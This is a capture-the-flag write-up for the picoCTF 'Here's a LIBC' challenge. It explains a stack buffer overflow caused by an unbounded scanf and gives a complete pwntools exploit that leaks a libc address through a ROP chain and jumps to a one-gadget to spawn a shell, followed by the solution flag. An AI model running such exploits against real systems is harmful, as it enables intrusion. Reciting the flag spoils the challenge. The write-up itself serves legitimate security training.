# Here's a LIBC

## Description

Author: madStacks

I am once again asking for you to pwn this binary vuln libc.so.6 Makefile nc mercury.picoctf.net 49464

## Challenge

We have a binary that prints anything you send it with alternating capitalisation:

```
-> % nc mercury.picoctf.net 49464
WeLcOmE To mY EcHo sErVeR!
Hello World
HeLlO WoRlD
abcdefgABCDEFG
AbCdEfGaBcDeFg
```

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Decompiled code

```c
void sym.do_stuff(void)
{
    undefined uVar1;
    undefined var_81h;
    char *s;
    int64_t var_10h;
    uint32_t var_8h;
    
    var_10h = 0;
    sym.imp.__isoc99_scanf("%[^\n]", &s);
    sym.imp.__isoc99_scanf(0x40093a, &var_81h);
    for (_var_8h = 0; _var_8h < 100; _var_8h = _var_8h + 1) {
        uVar1 = sym.convert_case((uint64_t)(uint32_t)(int32_t)*(char *)((int64_t)&s + _var_8h), _var_8h);
        *(undefined *)((int64_t)&s + _var_8h) = uVar1;
    }
    sym.imp.puts(&s);
    return;
}

void main(undefined8 argc, char **argv)
{
    char cVar1;
    char acStack168 [24];
    undefined8 uStack144;
    char **var_80h;
    int64_t var_74h;
    int64_t var_68h;
    int64_t var_60h;
    int64_t var_58h;
    char *s;
    int64_t var_40h;
    uint32_t var_38h;
    int64_t var_2ch;
    
    uStack144 = 0x40079c;
    var_80h = argv;
    var_74h._0_4_ = (undefined4)argc;
    sym.imp.setbuf(_reloc.stdout, 0);
    uStack144 = 0x4007a1;
    var_2ch._0_4_ = sym.imp.getegid();
    uStack144 = 0x4007bb;
    sym.imp.setresgid((undefined4)var_2ch, (undefined4)var_2ch, (undefined4)var_2ch, (undefined4)var_2ch);
    _var_38h = 0x1b;
    stack0xffffffffffffff88 = 0x20656d6f636c6557;
    var_68h = 0x636520796d206f74;
    var_60h = 0x6576726573206f68;
    var_58h._0_2_ = 0x2172;
    var_58h._2_1_ = 0;
    var_40h = 0x1a;
    s = acStack168;
    for (stack0xffffffffffffffd0 = 0; (uint64_t)stack0xffffffffffffffd0 < _var_38h;
        stack0xffffffffffffffd0 = stack0xffffffffffffffd0 + 1) {
        cVar1 = sym.convert_case((uint64_t)
                                 (uint32_t)(int32_t)*(char *)((int64_t)&var_74h + stack0xffffffffffffffd0 + 4U), 
                                 stack0xffffffffffffffd0);
        s[stack0xffffffffffffffd0] = cVar1;
    }
    sym.imp.puts(s);
    do {
        sym.do_stuff();
    } while( true );
}
```

## Solution

The program uses the function `sym.do_stuff` to read and modify user input, lets disassemble it:

```asm
[0x00400590]> pdf @ sym.do_stuff
            ; CALL XREF from main @ 0x40089b
┌ 153: sym.do_stuff ();
│           ; var int64_t var_81h @ rbp-0x81
│           ; var char *s @ rbp-0x80
│           ; var int64_t var_10h @ rbp-0x10
│           ; var uint32_t var_8h @ rbp-0x8
│           0x004006d8      55             push rbp
│           0x004006d9      4889e5         mov rbp, rsp
│           0x004006dc      4881ec900000.  sub rsp, 0x90
│           0x004006e3      48c745f00000.  mov qword [var_10h], 0
│           0x004006eb      488d4580       lea rax, [s]
│           0x004006ef      4889c6         mov rsi, rax
│           0x004006f2      488d3d3b0200.  lea rdi, str.___n_          ; 0x400934 ; "%[^\n]" ; const char *format
│           0x004006f9      b800000000     mov eax, 0
│           0x004006fe      e87dfeffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x00400703      488d857fffff.  lea rax, [var_81h]
│           0x0040070a      4889c6         mov rsi, rax
│           0x0040070d      488d3d260200.  lea rdi, [0x0040093a]       ; "%c" ; const char *format
│           0x00400714      b800000000     mov eax, 0
│           0x00400719      e862feffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x0040071e      48c745f80000.  mov qword [var_8h], 0
│       ┌─< 0x00400726      eb33           jmp 0x40075b
│       │   ; CODE XREF from sym.do_stuff @ 0x400760
│      ┌──> 0x00400728      488d5580       lea rdx, [s]
│      ╎│   0x0040072c      488b45f8       mov rax, qword [var_8h]
│      ╎│   0x00400730      4801d0         add rax, rdx
│      ╎│   0x00400733      0fb600         movzx eax, byte [rax]
│      ╎│   0x00400736      0fbec0         movsx eax, al
│      ╎│   0x00400739      488b55f8       mov rdx, qword [var_8h]
│      ╎│   0x0040073d      4889d6         mov rsi, rdx
│      ╎│   0x00400740      89c7           mov edi, eax
│      ╎│   0x00400742      e830ffffff     call sym.convert_case
│      ╎│   0x00400747      89c1           mov ecx, eax
│      ╎│   0x00400749      488d5580       lea rdx, [s]
│      ╎│   0x0040074d      488b45f8       mov rax, qword [var_8h]
│      ╎│   0x00400751      4801d0         add rax, rdx
│      ╎│   0x00400754      8808           mov byte [rax], cl
│      ╎│   0x00400756      488345f801     add qword [var_8h], 1
│      ╎│   ; CODE XREF from sym.do_stuff @ 0x400726
│      ╎└─> 0x0040075b      48837df863     cmp qword [var_8h], 0x63
│      └──< 0x00400760      76c6           jbe 0x400728
│           0x00400762      488d4580       lea rax, [s]
│           0x00400766      4889c7         mov rdi, rax                ; const char *s
│           0x00400769      e8d2fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0040076e      90             nop
│           0x0040076f      c9             leave
└           0x00400770      c3             ret
```

We can see that there is an unsafe call to `scanf` that reads into a buffer at `rbp-0x80`.
This `scanf` call reads until a newline character, there is no bounds checking.
Therefore, we can overflow the buffer and overwrite the return address.

ASLR is on, so we need to leak a libc address to use anything there.
PIE is off, so we know the address of PLT and GOT data.
We can use a ropchain to call `puts` and pass it the address of the `GOT` entry for the function.
This will print the address of `puts` in libc, which we can use to calculate the base address and offset to any other part of libc.

As the `sym.do_stuff` function is called in a loop, we can reuse this buffer overflow as much as necessary, as long as we don't crash the program.
After leaking the libc address, we can overwrite the return address a second time to jump to a one gadget and spawn a shell.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mercury.picoctf.net --port 49464 vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = ELF("./vuln")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'mercury.picoctf.net'
port = int(args.PORT or 49464)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    print(ld.path)
    print(libc.path)
    p = process([ld.path, exe.path] + argv, env={"LD_PRELOAD": libc.path}, *a, **kw)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
    return p


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b*0x004006d8
'''.format(**locals())
context.terminal = ["tmux", "splitw", "-h"]

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'./'

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

vuln = 0x004006d8

poprdi = 0x0000000000400913
ret = 0x000000000040052e
puts_plt = 0x00400540
puts_got = 0x00601018

libc_binsh = 0x001b40fa
libc_puts = 0x00080a30
libc_system = 0x04f4e0

payload = flat({
    0x88: [
        p64(poprdi),
        p64(puts_got),
        p64(puts_plt),
        p64(vuln),
        ]
    })

io.recvline()
io.sendline(payload)

io.recvline()
puts = u64(io.recvline().strip().ljust(8, b'\x00'))
print(hex(puts))

libc = puts - libc_puts
system = libc + libc_system
binsh = libc + libc_binsh

print(hex(libc))

payload2 = flat({
    0x88: [
        p64(0x10a45c+libc)
        ]
    })

io.sendline(payload2)

io.recvline()
io.interactive()

```

## Flag

`picoCTF{1_<3_sm4sh_st4cking_37b2dd6c2acb572a}`

